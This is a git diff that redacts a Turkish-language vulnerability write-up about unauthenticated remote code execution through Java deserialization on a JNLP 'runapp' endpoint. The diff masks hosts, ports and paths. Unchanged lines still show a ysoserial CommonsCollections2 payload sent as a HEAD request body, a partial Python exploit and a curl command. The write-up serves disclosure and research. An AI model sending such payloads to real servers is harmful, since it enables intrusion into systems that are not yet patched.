@@ -26,7 +26,7 @@ Kimlik doğrulaması olmadan, ağ üzerinden uzaktan kod çalıştırma mümkün
 
 ## Olay Akışı
 
-1. `http://xx.xxx.xx.xxx:8080/logo/smart/runapp?...` uç noktası tespit edildi; yanıt olarak JNLP döndürdüğü ve **kimlik doğrulaması istemediği** görüldü.
+1. `http://xx.xxx.xx.xxx:xxxx/xxxx/xxxx/runapp?...` uç noktası tespit edildi; yanıt olarak JNLP döndürdüğü ve **kimlik doğrulaması istemediği** görüldü.
 2. JNLP içinde ana bileşenler` Startupv3.29.6.4` gibi JAR’lara işaret ediyor.
 3. `Startupv3.29.6.4 `JAR analizi sırasında `com.lbs.start.SocketToken` sınıfında `new ServerSocket(port)` ve `new ObjectInputStream(...).readObject()` çağrıları belirlendi; gelen mesajlar filtre/allow-list olmadan işleniyor.
 4. `ysoserial` ile hazırlanan `payload.ser` CommonsCollections2 + TemplatesImpl + `Runtime.exec` **HEAD** isteğinin **gövdesi** olarak `/smart/runapp`’a gönderildi ve **sunucuda dosya oluşturma** ile RCE doğrulandı.
@@ -93,7 +93,7 @@ JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectIn
 ```python exploit.py
 import requests
 
-url = "http://xx.xxx.xxx.xx:8080/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001" ## Veriler Rastgeledir.
+url = "http://xx.xxx.xxx.xx:xxxx/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001" ## Veriler Rastgeledir.
 payload_file = "payload.ser" ## bizim dosya
 
 with open(payload_file, "rb") as f:
@@ -116,7 +116,7 @@ Veya
 curl -v --http1.1 -X HEAD \
   -H 'Content-Type: application/x-java-serialized-object' \
   --data-binary @payload.ser \
-  'http://host:8080/xxxx/smart/runapp'
+  'http://host:xxxx/xxxx/smart/runapp'
 ```
 
 ```bash Payload.ser
@@ -164,12 +164,7 @@ HEAD attığımızla birlikte python kodunda girdiğimiz link işlenmiş, oraya 
 
 Sonuç olarak, `exploit.py`'yi çalıştırdığım zaman sunucuda tmp/pwned klasörü oluştuğunu görebiliriz.
 
-<img
-  src="/images/photo_5785129057623149694_y.jpg"
-  alt="Photo 5785129057623149694 Y Jp"
-  title="Photo 5785129057623149694 Y Jp"
-  style={{ width:"100%" }}
-/>
+![Görsel 2025 11 05 195035620 Pn](/images/görsel_2025-11-05_195035620.png)
 
 Şu anda ilgili firma zafiyeti tamamen gidermediği için, güvenlik riski devam ettiği sürece ayrıntılı poc veya exploit kodu yayımlamıyorum.
 
@@ -181,7 +176,7 @@ Sonuç olarak, `exploit.py`'yi çalıştırdığım zaman sunucuda tmp/pwned kla
 
 # Saldırı yüzeyi
 
-- **Giriş noktası:** `/logo/smart/runapp` (JNLP üretim noktası)  HEAD/GET isteklerine yanıt veriyor.
+- **Giriş noktası:** `/xxxx/smart/runapp` (JNLP üretim noktası)  HEAD/GET isteklerine yanıt veriyor.
 - **Parametre kökeni:** JNLP içindeki `DOCUMENT_URI` argümanı istemci tarafından okunuyor; sunucu tarafında bu URI’ye karşılık gelen belge/akış işlenirken gövde verisi **HTTP metodundan bağımsız** olarak elde edilebiliyor.
 - **Metot semantiği ihlali:** HTTP/1.1’de HEAD gövdesi anlamsal olarak yok sayılmalıdır; ancak uygulama ortak handler’da `getInputStream()`’i koşulsuz okuduğu için HEAD ile gönderilen serialized içerik de işlenebiliyor.
 
